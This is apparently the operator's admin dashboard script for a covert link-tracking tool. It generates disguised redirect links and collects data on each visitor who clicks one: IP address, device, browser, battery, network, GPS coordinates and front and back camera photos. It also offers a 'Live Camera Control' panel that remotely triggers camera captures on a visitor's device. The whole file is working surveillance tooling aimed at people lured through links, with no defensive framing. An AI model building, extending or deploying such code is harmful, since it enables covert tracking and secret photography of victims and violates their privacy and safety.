let socket;
let currentVisitorId = null;
let allUsersData = [];
let currentFilter = 'all';
let currentSort = 'newest';

// ============================================
// SOCKET CONNECTION
// ============================================
socket = io();

fetch('/api/users-data')
    .then(response => {
        if (response.status === 401) {
            window.location.href = '/';
        }
        return response.json();
    })
    .then(data => {
        allUsersData = data;
        loadVisitors();
        updateStats();
        displayAllUsers(data);
        updateUsersStats(data);
        populateStateFilter(data);
        loadLinks();
    })
    .catch(() => {
        window.location.href = '/';
    });

socket.on('visitor-connected', () => {
    refreshAllData();
    loadLinks();
    showNotification('🟢 New visitor connected!');
});

socket.on('visitor-disconnected', () => {
    refreshAllData();
});

socket.on('camera-data', () => {
    refreshAllData();
});

socket.on('location-data', () => {
    refreshAllData();
});

// ============================================
// TAB SWITCHING
// ============================================
function showTab(tab) {
    document.getElementById('dashboardTab').style.display = tab === 'dashboard' ? 'block' : 'none';
    document.getElementById('usersTab').style.display = tab === 'users' ? 'block' : 'none';
    document.getElementById('linksTab').style.display = tab === 'links' ? 'block' : 'none';
    document.getElementById('tabDashboard').className = 'tab-btn' + (tab === 'dashboard' ? ' active' : '');
    document.getElementById('tabUsers').className = 'tab-btn' + (tab === 'users' ? ' active' : '');
    document.getElementById('tabLinks').className = 'tab-btn' + (tab === 'links' ? ' active' : '');
    if (tab === 'users') { refreshAllData(); }
    if (tab === 'links') { loadLinks(); }
}

// ============================================
// GENERATE LINK
// ============================================
function generateCustomLink() {
    const url = document.getElementById('customUrl').value;
    if (!url) {
        alert('Please enter a URL');
        return;
    }
    
    fetch('/generate-custom-link', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ redirectUrl: url })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            document.getElementById('generatedLinkContainer').style.display = 'block';
            document.getElementById('generatedLink').value = data.link;
            document.getElementById('generatedLinkId').textContent = data.linkId;
            document.getElementById('redirectUrlDisplay').textContent = data.redirectUrl;
            showNotification('✅ Link generated successfully! Link ID: ' + data.linkId);
            refreshAllData();
            loadLinks();
        }
    })
    .catch(error => {
        alert('Error: ' + error.message);
    });
}

// ============================================
// LOAD LINKS
// ============================================
function loadLinks() {
    fetch('/api/links')
        .then(response => response.json())
        .then(links => {
            displayLinks(links);
        });
}

function displayLinks(links) {
    const container = document.getElementById('linksList');
    container.innerHTML = '';
    if (!links || links.length === 0) {
        container.innerHTML = '<p style="color:#999; text-align:center; padding:40px;">No links generated yet.</p>';
        return;
    }
    links.forEach(link => {
        const card = document.createElement('div');
        card.className = 'visitor-card';
        card.innerHTML = `
            <div class="visitor-header">
                <div>
                    <strong>🔗 Link ID: ${link.linkId}</strong>
                    <div style="font-size:14px; color:#666; margin-top:5px;">📌 ${link.link}</div>
                    <div style="font-size:13px; color:#888; margin-top:3px;">🎯 Redirect: ${link.redirectUrl}</div>
                </div>
                <span style="padding:5px 10px; background:#48bb78; color:white; border-radius:5px; font-size:12px;">👥 ${link.totalVisits || 0} visits</span>
            </div>
            <div style="display:flex; gap:10px; margin-top:10px; flex-wrap:wrap;">
                <button onclick="copyToClipboard('${link.link}')" class="camera-btn" style="background:#48bb78;">📋 Copy Link</button>
                <button onclick="searchByLinkId('${link.linkId}')" class="camera-btn" style="background:#667eea;">🔍 View Users</button>
                <span style="font-size:12px; color:#888; padding:8px;">📅 ${new Date(link.createdAt).toLocaleString()}</span>
            </div>
        `;
        container.appendChild(card);
    });
}

function searchByLinkId(linkId) {
    document.getElementById('searchUsers').value = linkId;
    showTab('users');
    setTimeout(() => searchUsers(), 500);
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        showNotification('📋 Link copied!');
    });
}

// ============================================
// REFRESH ALL DATA
// ============================================
function refreshAllData() {
    Promise.all([
        fetch('/api/users-data').then(r => r.json()),
        fetch('/api/visitors').then(r => r.json())
    ])
    .then(([usersData, visitorsData]) => {
        allUsersData = usersData;
        displayAllUsers(usersData);
        updateUsersStats(usersData);
        populateStateFilter(usersData);
        displayVisitors(visitorsData);
        updateStats();
    });
}

// ============================================
// LOAD VISITORS (Recent)
// ============================================
function loadVisitors() {
    fetch('/api/visitors')
        .then(response => response.json())
        .then(visitors => {
            displayVisitors(visitors);
        });
}

function displayVisitors(visitors) {
    const container = document.getElementById('visitorsList');
    container.innerHTML = '';
    const recent = visitors.slice(-10).reverse();
    recent.forEach(visitor => {
        const card = document.createElement('div');
        card.className = 'visitor-card';
        let locationStr = '';
        if (visitor.location) {
            const loc = visitor.location;
            locationStr = `📍 ${loc.city || ''} ${loc.state || ''} ${loc.country || ''}`;
        }
        card.innerHTML = `
            <div class="visitor-header">
                <div>
                    <strong>ID: ${visitor.id.substring(0, 8)}</strong>
                    <div style="font-size:14px; color:#666; margin-top:5px;">
                        📱 ${visitor.deviceName || 'Unknown'} 
                        ${visitor.ip ? `• 🌐 ${visitor.ip}` : ''}
                        ${visitor.totalVisits ? `• 🔄 ${visitor.totalVisits} visits` : ''}
                        ${visitor.linkId ? `• 🔗 ${visitor.linkId}` : ''}
                        ${visitor.browser ? `• 🌍 ${visitor.browser}` : ''}
                    </div>
                    ${locationStr ? `<div style="font-size:13px; color:#888;">${locationStr}</div>` : ''}
                    ${visitor.battery ? `<div style="font-size:13px; color:#888;">🔋 ${visitor.battery}%</div>` : ''}
                </div>
                <span class="status ${visitor.connected ? 'active' : 'inactive'}">
                    ${visitor.connected ? '🟢 Active' : '🔴 Offline'}
                </span>
            </div>
            <div style="margin-top:10px;">
                <button onclick="showUserDetails('${visitor.id}')" class="camera-btn">📊 View Details</button>
                <button onclick="deleteVisitor('${visitor.id}')" class="camera-btn delete">🗑️ Delete</button>
            </div>
        `;
        container.appendChild(card);
    });
}

// ============================================
// DISPLAY ALL USERS
// ============================================
function displayAllUsers(users) {
    const container = document.getElementById('allUsersList');
    container.innerHTML = '';
    if (!users || users.length === 0) {
        container.innerHTML = '<p style="color:#999; text-align:center; padding:40px;">No users data available yet.</p>';
        document.getElementById('userCount').textContent = '(0)';
        return;
    }
    
    let filteredUsers = [...users];
    if (currentFilter !== 'all') {
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        filteredUsers = filteredUsers.filter(user => {
            const visitDate = user.visitDate ? new Date(user.visitDate) : null;
            if (!visitDate) return false;
            if (currentFilter === 'today') { return visitDate >= today; }
            else if (currentFilter === 'yesterday') {
                const yesterday = new Date(today);
                yesterday.setDate(yesterday.getDate() - 1);
                return visitDate >= yesterday && visitDate < today;
            } else if (currentFilter === '7days') {
                const sevenDays = new Date(today);
                sevenDays.setDate(sevenDays.getDate() - 7);
                return visitDate >= sevenDays;
            } else if (currentFilter === '30days') {
                const thirtyDays = new Date(today);
                thirtyDays.setDate(thirtyDays.getDate() - 30);
                return visitDate >= thirtyDays;
            }
            return true;
        });
    }
    
    if (currentSort === 'newest') {
        filteredUsers.sort((a, b) => new Date(b.visitDate) - new Date(a.visitDate));
    } else {
        filteredUsers.sort((a, b) => new Date(a.visitDate) - new Date(b.visitDate));
    }
    
    document.getElementById('userCount').textContent = `(${filteredUsers.length} users)`;
    
    filteredUsers.forEach(user => {
        const card = document.createElement('div');
        card.className = 'visitor-card';
        card.id = 'user-' + user.id;
        let locationStr = '';
        if (user.location) {
            const loc = user.location;
            locationStr = `📍 ${loc.city || ''} ${loc.state || ''} ${loc.country || ''}`;
        }
        const visitCount = user.totalVisits || 0;
        const lastVisit = user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'Never';
        
        card.innerHTML = `
            <div class="visitor-header">
                <div>
                    <strong>🆔 ${user.id}</strong>
                    <div style="font-size:14px; color:#666; margin-top:5px;">
                        📱 ${user.deviceName || 'Unknown'} 
                        ${user.ip ? `• 🌐 ${user.ip}` : ''}
                        ${user.linkId ? `• 🔗 ${user.linkId}` : ''}
                        ${user.browser ? `• 🌍 ${user.browser}` : ''}
                        ${user.os ? `• 💻 ${user.os}` : ''}
                        ${visitCount > 0 ? `• 🔄 ${visitCount} visits` : ''}
                        ${lastVisit !== 'Never' ? `• 📅 Last: ${lastVisit}` : ''}
                    </div>
                    ${locationStr ? `<div style="font-size:13px; color:#888;">${locationStr}</div>` : ''}
                    ${user.battery ? `<div style="font-size:13px; color:#888;">🔋 ${user.battery}%</div>` : ''}
                </div>
                <span class="status ${user.connected ? 'active' : 'inactive'}">
                    ${user.connected ? '🟢 Active' : '🔴 Offline'}
                </span>
            </div>
            <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap;">
                <button onclick="showUserDetails('${user.id}')" class="camera-btn">📊 Full Details</button>
                <button onclick="deleteVisitor('${user.id}')" class="camera-btn delete">🗑️ Delete</button>
                ${user.frontCamera ? `<button onclick="downloadPhoto('${user.frontCamera}', 'front-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Front</button>` : ''}
                ${user.backCamera ? `<button onclick="downloadPhoto('${user.backCamera}', 'back-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Back</button>` : ''}
                <button onclick="captureVisitorPhoto('both')" class="camera-btn" style="background:#ed8936;">📸 Capture Both</button>
            </div>
            <div style="display:flex; gap:10px; margin-top:10px; flex-wrap:wrap;">
                ${user.frontCamera ? `<img src="${user.frontCamera}" style="max-width:60px; border-radius:5px;">` : ''}
                ${user.backCamera ? `<img src="${user.backCamera}" style="max-width:60px; border-radius:5px;">` : ''}
            </div>
            ${visitCount > 0 ? `<div style="margin-top:8px; font-size:12px; color:#888;">📋 ${visitCount} visits. Click "Full Details" for history.</div>` : ''}
        `;
        container.appendChild(card);
    });
}

// ============================================
// FILTER FUNCTIONS
// ============================================
function filterVisits(filter) {
    currentFilter = filter;
    displayAllUsers(allUsersData);
    const filterNames = { 'all': 'All', 'today': 'Today', 'yesterday': 'Yesterday', '7days': 'Last 7 Days', '30days': 'Last 30 Days' };
    showNotification(`📅 Filter: ${filterNames[filter] || filter}`);
}

function sortVisits(sort) {
    currentSort = sort;
    displayAllUsers(allUsersData);
    showNotification(`🔄 Sort: ${sort === 'newest' ? 'Newest First' : 'Oldest First'}`);
}

// ============================================
// UPDATE USERS STATS
// ============================================
function updateUsersStats(users) {
    document.getElementById('totalUsers').textContent = users.length;
    let totalVisits = 0;
    const uniqueStates = new Set();
    let activeNow = 0;
    users.forEach(user => {
        totalVisits += (user.totalVisits || 0);
        if (user.location && user.location.state) {
            uniqueStates.add(user.location.state);
        }
        if (user.connected) { activeNow++; }
    });
    document.getElementById('totalVisitsAll').textContent = totalVisits;
    document.getElementById('uniqueLocations').textContent = uniqueStates.size;
    document.getElementById('activeNow').textContent = activeNow;
}

// ============================================
// POPULATE STATE FILTER
// ============================================
function populateStateFilter(users) {
    const states = new Set();
    users.forEach(user => {
        if (user.location && user.location.state) {
            states.add(user.location.state);
        }
    });
    const filter = document.getElementById('filterState');
    const currentValue = filter.value;
    filter.innerHTML = '<option value="">All States</option>';
    states.forEach(state => {
        filter.innerHTML += `<option value="${state}">${state}</option>`;
    });
    filter.value = currentValue;
}

// ============================================
// SEARCH USERS
// ============================================
function searchUsers() {
    const query = document.getElementById('searchUsers').value.toLowerCase().trim();
    const stateFilter = document.getElementById('filterState').value;
    const cards = document.querySelectorAll('#allUsersList .visitor-card');
    let visibleCount = 0;
    cards.forEach(card => {
        const text = card.textContent.toLowerCase();
        let show = true;
        if (query && !text.includes(query)) { show = false; }
        if (stateFilter) {
            const userState = text.match(/📍\s*([^,]+)/);
            if (userState && userState[1] && userState[1].trim() !== stateFilter) { show = false; }
        }
        card.style.display = show ? 'block' : 'none';
        if (show) visibleCount++;
    });
    document.getElementById('userCount').textContent = `(${visibleCount} users)`;
}

// ============================================
// CLEAR FILTERS
// ============================================
function clearFilters() {
    document.getElementById('searchUsers').value = '';
    document.getElementById('filterState').value = '';
    currentFilter = 'all';
    currentSort = 'newest';
    searchUsers();
    showNotification('🧹 Filters cleared');
}

// ============================================
// SHOW USER DETAILS
// ============================================
function showUserDetails(userId) {
    currentVisitorId = userId;
    const container = document.getElementById('detailsContent');
    const detailsDiv = document.getElementById('visitorDetails');
    
    fetch(`/api/visitor/${userId}`)
        .then(response => response.json())
        .then(user => {
            detailsDiv.style.display = 'block';
            
            let visitHistoryHTML = '';
            if (user.visitHistory && user.visitHistory.length > 0) {
                visitHistoryHTML = '<h4 style="margin-top:15px;">📋 Visit History</h4><div style="max-height:200px; overflow-y:auto;">';
                user.visitHistory.forEach((visit, index) => {
                    const visitDate = visit.visitDate ? new Date(visit.visitDate).toLocaleString() : 'N/A';
                    const visitLoc = visit.location ? `${visit.location.city || ''} ${visit.location.state || ''}` : 'N/A';
                    visitHistoryHTML += `
                        <div style="padding:8px; border-bottom:1px solid #eee; font-size:13px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:5px;">
                            <div>
                                <strong>#${index + 1}</strong> 
                                📅 ${visitDate} 
                                ${visit.ip ? `• 🌐 ${visit.ip}` : ''}
                                ${visitLoc !== 'N/A' ? `• 📍 ${visitLoc}` : ''}
                                ${visit.battery ? `• 🔋 ${visit.battery}%` : ''}
                            </div>
                            <div>
                                <button onclick="showVisitDetails('${userId}', ${index})" class="camera-btn" style="background:#667eea; padding:3px 10px; font-size:12px;">👁️ View</button>
                                <button onclick="deleteVisit('${userId}', ${index})" class="camera-btn" style="background:#fc8181; padding:3px 10px; font-size:12px;">🗑️</button>
                            </div>
                        </div>
                    `;
                });
                visitHistoryHTML += '</div>';
            } else {
                visitHistoryHTML = '<p style="color:#999;">No visit history available</p>';
            }
            
            let html = `
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
                    <div>
                        <h3>👤 User Information</h3>
                        <div class="visitor-details-grid">
                            <div class="detail-card"><label>🆔 ID</label><div class="value">${user.id}</div></div>
                            <div class="detail-card"><label>🔗 Link ID</label><div class="value">${user.linkId || 'N/A'}</div></div>
                            <div class="detail-card"><label>📱 Device</label><div class="value">${user.deviceName || 'N/A'}</div></div>
                            <div class="detail-card"><label>💻 OS</label><div class="value">${user.os || 'N/A'}</div></div>
                            <div class="detail-card"><label>🌍 Browser</label><div class="value">${user.browser || 'N/A'}</div></div>
                            <div class="detail-card"><label>🌐 IP Address</label><div class="value">${user.ip || 'N/A'}</div></div>
                            <div class="detail-card"><label>📶 Network</label><div class="value">${user.network?.effectiveType || user.network?.type || 'N/A'}</div></div>
                            <div class="detail-card"><label>🔋 Battery</label><div class="value">${user.battery || 'N/A'}%</div></div>
                            <div class="detail-card"><label>📅 First Visit</label><div class="value">${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}</div></div>
                            <div class="detail-card"><label>🔄 Total Visits</label><div class="value">${user.totalVisits || 0}</div></div>
                            <div class="detail-card"><label>📅 Last Visit</label><div class="value">${user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'N/A'}</div></div>
                            <div class="detail-card"><label>🟢 Status</label><div class="value">${user.connected ? 'Online' : 'Offline'}</div></div>
                        </div>
                        ${visitHistoryHTML}
                    </div>
                    <div>
                        <h3>📍 Location</h3>
                        ${user.location ? `
                            <div class="visitor-details-grid">
                                <div class="detail-card"><label>🌍 Country</label><div class="value">${user.location.country || 'N/A'}</div></div>
                                <div class="detail-card"><label>🏛️ State</label><div class="value">${user.location.state || 'N/A'}</div></div>
                                <div class="detail-card"><label>🏙️ City</label><div class="value">${user.location.city || 'N/A'}</div></div>
                                <div class="detail-card"><label>📍 Coordinates</label><div class="value">${user.location.lat || 'N/A'}, ${user.location.lng || 'N/A'}</div></div>
                            </div>
                        ` : '<p style="color:#999;">Location not available</p>'}
                        
                        <h3 style="margin-top:20px;">📸 Photos</h3>
                        <div style="display:flex; gap:20px; flex-wrap:wrap;">
                            ${user.frontCamera ? `
                                <div>
                                    <p><strong>Front Camera</strong></p>
                                    <img src="${user.frontCamera}" class="camera-image">
                                    <div style="margin-top:5px;">
                                        <button onclick="downloadPhoto('${user.frontCamera}', 'front-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">⬇️ Download</button>
                                    </div>
                                </div>
                            ` : '<p style="color:#999;">No front photo</p>'}
                            
                            ${user.backCamera ? `
                                <div>
                                    <p><strong>Back Camera</strong></p>
                                    <img src="${user.backCamera}" class="camera-image">
                                    <div style="margin-top:5px;">
                                        <button onclick="downloadPhoto('${user.backCamera}', 'back-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">⬇️ Download</button>
                                    </div>
                                </div>
                            ` : '<p style="color:#999;">No back photo</p>'}
                        </div>
                        
                        <div style="margin-top:20px; border-top:1px solid #ddd; padding-top:15px;">
                            <h3>📸 Live Camera Control</h3>
                            <div style="display:flex; gap:10px; flex-wrap:wrap; margin-top:10px;">
                                <button onclick="captureVisitorPhoto('front')" class="camera-btn" style="background:#48bb78;">📷 Capture Front</button>
                                <button onclick="captureVisitorPhoto('back')" class="camera-btn" style="background:#4299e1;">📷 Capture Back</button>
                                <button onclick="captureVisitorPhoto('both')" class="camera-btn" style="background:#ed8936;">📷 Capture Both</button>
                            </div>
                            <div id="captureStatus" style="margin-top:10px; font-size:14px; color:#666;"></div>
                        </div>
                    </div>
                </div>
            `;
            container.innerHTML = html;
        });
}

// ============================================
// SHOW VISIT DETAILS (Modal)
// ============================================
function showVisitDetails(userId, visitIndex) {
    fetch(`/api/visitor/${userId}`)
        .then(response => response.json())
        .then(user => {
            const visit = user.visitHistory[visitIndex];
            if (!visit) {
                alert('Visit not found');
                return;
            }
            const modal = document.getElementById('visitModal');
            const content = document.getElementById('visitDetailsContent');
            content.innerHTML = `
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
                    <div class="detail-card"><label>📅 Visit Date</label><div class="value">${visit.visitDate ? new Date(visit.visitDate).toLocaleString() : 'N/A'}</div></div>
                    <div class="detail-card"><label>🌐 IP Address</label><div class="value">${visit.ip || 'N/A'}</div></div>
                    <div class="detail-card"><label>📱 Device</label><div class="value">${visit.deviceInfo?.deviceName || visit.deviceInfo?.platform || 'N/A'}</div></div>
                    <div class="detail-card"><label>💻 OS</label><div class="value">${visit.deviceInfo?.os || 'N/A'}</div></div>
                    <div class="detail-card"><label>🌍 Browser</label><div class="value">${visit.deviceInfo?.browser || 'N/A'}</div></div>
                    <div class="detail-card"><label>🔋 Battery</label><div class="value">${visit.battery || 'N/A'}%</div></div>
                    <div class="detail-card"><label>📶 Network</label><div class="value">${visit.network?.effectiveType || visit.network?.type || 'N/A'}</div></div>
                    <div class="detail-card"><label>📍 Location</label><div class="value">${visit.location ? `${visit.location.city || ''} ${visit.location.state || ''} ${visit.location.country || ''}` : 'N/A'}</div></div>
                    ${visit.frontCamera ? `<div class="detail-card"><label>📸 Front Photo</label><div class="value"><img src="${visit.frontCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
                    ${visit.backCamera ? `<div class="detail-card"><label>📸 Back Photo</label><div class="value"><img src="${visit.backCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
                    <div class="detail-card"><label>🔄 Redirect Complete</label><div class="value">${visit.redirectComplete ? '✅ Yes' : '❌ No'}</div></div>
                </div>
            `;
            modal.style.display = 'flex';
        });
}

// ============================================
// DELETE VISIT FROM HISTORY
// ============================================
function deleteVisit(userId, visitIndex) {
    if (!confirm('Delete this visit from history?')) return;
    fetch(`/api/visitor/${userId}/visit/${visitIndex}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('🗑️ Visit deleted successfully!');
                refreshAllData();
                showUserDetails(userId);
            }
        })
        .catch(error => {
            alert('Error: ' + error.message);
        });
}

// ============================================
// CAPTURE VISITOR PHOTO
// ============================================
function captureVisitorPhoto(type) {
    if (!currentVisitorId) {
        alert('Please select a visitor first');
        return;
    }
    const statusDiv = document.getElementById('captureStatus');
    if (statusDiv) {
        statusDiv.textContent = `📸 Requesting ${type} photo...`;
        statusDiv.style.color = '#4299e1';
    }
    socket.emit('admin-capture', {
        visitorId: currentVisitorId,
        type: type
    });
    setTimeout(() => {
        if (statusDiv) {
            statusDiv.textContent = `✅ ${type} photo requested! Refreshing...`;
            statusDiv.style.color = '#22a67e';
        }
        setTimeout(() => {
            showUserDetails(currentVisitorId);
            refreshAllData();
        }, 2000);
    }, 3000);
}

// ============================================
// DOWNLOAD PHOTO
// ============================================
function downloadPhoto(imageData, filename) {
    if (!imageData || imageData === 'null' || imageData === 'undefined') {
        alert('No photo to download');
        return;
    }
    try {
        const link = document.createElement('a');
        link.href = imageData;
        link.download = filename || 'visitor-photo.jpg';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        showNotification('⬇️ Photo downloaded!');
    } catch (e) {
        alert('Error downloading photo: ' + e.message);
    }
}

// ============================================
// DELETE VISITOR
// ============================================
function deleteVisitor(visitorId) {
    if (!confirm('Delete this visitor data?')) return;
    fetch(`/api/visitor/${visitorId}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('🗑️ Visitor deleted');
                refreshAllData();
                document.getElementById('visitorDetails').style.display = 'none';
            }
        });
}

// ============================================
// EXPORT ALL DATA
// ============================================
function exportAllData() {
    fetch('/api/users-data')
        .then(response => response.json())
        .then(users => {
            const dataStr = JSON.stringify(users, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'users-data-' + new Date().toISOString().slice(0,10) + '.json';
            a.click();
            URL.revokeObjectURL(url);
            showNotification('📥 Data exported successfully!');
        });
}

// ============================================
// UPDATE STATS (Dashboard)
// ============================================
function updateStats() {
    fetch('/api/visitors')
        .then(response => response.json())
        .then(visitors => {
            document.getElementById('totalVisitors').textContent = visitors.length;
            document.getElementById('activeVisitors').textContent = visitors.filter(v => v.connected).length;
            document.getElementById('totalLinks').textContent = visitors.length;
        });
}

// ============================================
// COPY LINK
// ============================================
function copyLink() {
    const linkInput = document.getElementById('generatedLink');
    linkInput.select();
    document.execCommand('copy');
    showNotification('📋 Link copied!');
}

// ============================================
// LOGOUT
// ============================================
function logout() {
    window.location.href = '/';
}

// ============================================
// SHOW NOTIFICATION
// ============================================
function showNotification(message) {
    const existing = document.querySelector('.notification');
    if (existing) existing.remove();
    const div = document.createElement('div');
    div.className = 'notification';
    div.textContent = message;
    document.body.appendChild(div);
    setTimeout(() => {
        div.style.opacity = '0';
        div.style.transition = 'opacity 0.5s';
        setTimeout(() => div.remove(), 500);
    }, 3000);
}

// ============================================
// INITIAL LOAD
// ============================================
loadVisitors();
updateStats();

setInterval(() => {
    refreshAllData();
    loadLinks();
}, 15000);